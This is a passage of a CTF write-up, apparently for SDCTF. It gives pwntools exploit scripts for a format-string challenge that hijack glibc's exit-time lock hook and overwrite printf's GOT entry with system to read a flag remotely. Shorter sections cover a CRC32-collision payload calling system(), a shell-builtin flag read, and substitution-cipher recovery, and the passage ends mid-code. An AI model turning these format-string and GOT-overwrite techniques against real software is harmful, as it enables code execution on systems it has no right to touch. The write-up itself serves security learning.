class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>And</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>_dl_fini()</code> will be registered by <code>_cxa_atexit</code> in <code>__libc_start_main()</code>. And <code>_dl_fini()</code> will be called by <code>__run_exit_handlers()</code> when the program exits. And <code>rtld_lock_default_lock_recursive</code> will be called by <code>_dl_fini()</code>. So if we overwrite this field, we can jump back to main when the program exits. Then turn the challenge into a normal format string challenge.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r14   : 0x00007fffffffdc40  →  0x00007ffff7e2b170  →  0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">debug=<span class="literal">False</span></span>):</span></span><br><span class="line">    REMOTE_MODE = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    REMOTE_MODE = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    sh = process(<span class="string">&quot;./money-printer2&quot;</span>,stdin=PTY,raw=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#sh = None</span></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">1</span>:</span><br><span class="line">        sh = remote(<span class="string">&quot;greed.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x00000000004008F2</span></span><br><span class="line">    exit_got = <span class="number">0x601020</span></span><br><span class="line">    tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">0</span> <span class="keyword">and</span> debug == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;%4196096c%11$lln&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x41&#x27;</span>)+<span class="string">b&#x27;\x60\xaf&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload+<span class="string">b&#x27;\4\4&#x27;</span>)</span><br><span class="line">    printf_got = <span class="number">0x601038</span></span><br><span class="line">    system_plt = <span class="number">0x4006B0</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_plt&#125;))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;me!&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;cat flag; cat flag.txt; cat flag*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># sh = hack(False)</span></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = hack(sys.argv[<span class="number">2</span>] == <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">        dt = sh.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;getflag.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(dt)</span><br><span class="line">        sh.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Canary">Canary</h4>
<p>There are also some residual stack pointers on the stack. We can partially overwrite them and make them point to the canary. Then overwrite the GOT entry of <code>__stack_chk_fail</code> to <code>main</code> and turn the challenge into a normal format string challenge.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r14   : 0x00007fffffffdc40  →  0x00007ffff7e2b170  →  0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">debug=<span class="literal">False</span></span>):</span></span><br><span class="line">    REMOTE_MODE = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    REMOTE_MODE = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    sh = process(<span class="string">&quot;./money-printer2&quot;</span>,stdin=PTY,raw=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">1</span>:</span><br><span class="line">        sh = remote(<span class="string">&quot;greed.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x00000000004008F2</span></span><br><span class="line">    exit_got = <span class="number">0x601020</span></span><br><span class="line">    tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">0</span> <span class="keyword">and</span> debug == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;%4196096c%11$lln&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x41&#x27;</span>)+<span class="string">b&#x27;\x60\xaf&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload+<span class="string">b&#x27;\4\4&#x27;</span>)</span><br><span class="line">    <span class="comment">#sleep(15)</span></span><br><span class="line">    r = sh.recvuntil(<span class="string">b&#x27;\x60\xaf&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x60\xaf&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    r = sh.recvuntil(<span class="string">b&#x27;gotten me&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;gotten me&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = hack(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>Didn’t have the luck to hit the 1/4096 probability :(</p>
<h2 id="Misc">Misc</h2>
<h3 id="Secure-Runner">Secure Runner</h3>
<p>CRC32 collision. Easy to find with <code>https://github.com/theonlypwner/crc32/</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_GUESS 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));</span><br><span class="line">	system(<span class="string">&quot;ls -al; cat flag.txt&quot;</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_guesses = NUM_GUESS;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, num_guesses) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> secret = rand() % max;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Guess a number from 0 to %u in %u guesses:\n&quot;</span>, max, num_guesses);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(num_guesses &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (num_guesses != NUM_GUESS) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Next Guess (%u left):\n&quot;</span>, num_guesses);</span><br><span class="line">		&#125;</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> guess = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>,&amp;guess);</span><br><span class="line">		<span class="keyword">if</span> (guess == secret) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Congrats, you won!\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (secret &lt; guess) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Number is lower! &quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Number is higher! &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		num_guesses--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You ran out of guesses :(\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SduBPZpheWz</span></span><br></pre></td></tr></table></figure>
<h3 id="Fork-bomb-protector">Fork bomb protector</h3>
<p>Use the built-in command to read the flag.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo *</span><br><span class="line">while read -r data;</span><br><span class="line">do</span><br><span class="line">	echo &quot;$data&quot;;</span><br><span class="line">done &lt; &quot;flag.txt&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto">Crypto</h2>
<h3 id="Jumbled-snake">Jumbled snake</h3>
<p>First, recover the key with<br>
<code>the_quick_brown_fox_jumps_over_the_lazy_dog</code><br>
By regex matching, we can find the pattern easily.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    match = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line">        charset = string.printable</span><br><span class="line">        <span class="keyword">for</span> I <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># find pattern xxxIxxxxxIxxxxxIxxxIxxxxxIxxxxIxxxIxxxxIxxx</span></span><br><span class="line">            <span class="comment"># I is a printable character</span></span><br><span class="line">            <span class="comment"># x is arbitrary character</span></span><br><span class="line">            regex = <span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span></span><br><span class="line">            match = re.search(regex, code)</span><br><span class="line">            <span class="keyword">if</span> match:</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="built_in">print</span>(I)</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="comment"># get the matched string</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>Now recover the key with <code>__doc__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">origin = <span class="string">&quot;the_quick_brown_fox_jumps_over_the_lazy_dog&quot;</span></span><br><span class="line">encoded = match.group()</span><br><span class="line">span = match.span()</span><br><span class="line">key = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin)):</span><br><span class="line">    key[encoded[i]] = origin[i]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    e = f.read()</span><br><span class="line">    encoded = <span class="string">&quot;&#x27;: 123456789.0, &#x27;items&#x27;:[]&#125;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encoded):</span><br><span class="line">        key[e[i+span[<span class="number">1</span>]]] = encoded[i]</span><br><span class="line">        i+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>Some keys can be identified by ourself now</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key[<span class="string">&#x27;y&#x27;</span>] = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;]&#x27;</span>] = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;J&#x27;</span>] = <span class="string">&#x27;=&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;^&#x27;</span>] = <span class="string">&#x27;(&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;g&#x27;</span>] = <span class="string">&#x27;)&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;.&#x27;</span>] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;=&#x27;</span>] = <span class="string">&#x27;!&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Now try to recover the script, we can notice the second hint.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode_flag.__doc__.upper()[<span class="number">2</span>:<span class="number">45</span>] == reverse(check.__doc__)</span><br></pre></td></tr></table></figure>
<p>And recover the script with this hint.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    origin = <span class="string">&quot;&#123;&#x27;the_quick_brown_fox_jumps_over_the_lazy_dog&#x27;:&quot;</span></span><br><span class="line">    check_doc = <span class="string">&quot;&quot;&quot;F+</span></span><br><span class="line"><span class="string">_f5&#125;I_7|0_17s+_B&amp;N)K_n+(_,O+1q_CQ*)`_7|0&quot;&quot;&quot;</span></span><br><span class="line">    check_doc = <span class="built_in">list</span>(<span class="built_in">reversed</span>(check_doc))</span><br><span class="line">    origin_upper = origin.upper()[<span class="number">2</span>:<span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin_upper)):</span><br><span class="line">        <span class="keyword">if</span> check_doc[i] <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            key[check_doc[i]] = origin_upper[i]</span><br></pre></td></tr></table></figure>
<p>And finally we have</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_key</span>(<span class="params">charset: <span class="built_in">str</span> = string.printable</span>):</span></span><br><span class="line">    chars_left = <span class="built_in">list</span>(charset)</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        val = secrets.choice(chars_left)</span><br><span class="line">        chars_left.remove(val)</span><br><span class="line">        key[char] = val</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">not</span> chars_left</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subs</span>(<span class="params">msg: <span class="built_in">str</span>, key</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(key[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 5 5 3 5 4 3 4 3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    match = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line">        charset = string.printable</span><br><span class="line">        <span class="keyword">for</span> I <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># find pattern xxxIxxxxxIxxxxxIxxxIxxxxxIxxxxIxxxIxxxxIxxx</span></span><br><span class="line">            <span class="comment"># I is a printable character</span></span><br><span class="line">            <span class="comment"># x is arbitrary character</span></span><br><span class="line">            regex = <span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span></span><br><span class="line">            match = re.search(regex, code)</span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">and</span> I == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="built_in">print</span>(I)</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="comment"># get the matched string</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found&quot;</span>)</span><br><span class="line">    origin = <span class="string">&quot;the_quick_brown_fox_jumps_over_the_lazy_dog&quot;</span></span><br><span class="line">    encoded = match.group()</span><br><span class="line">    span = 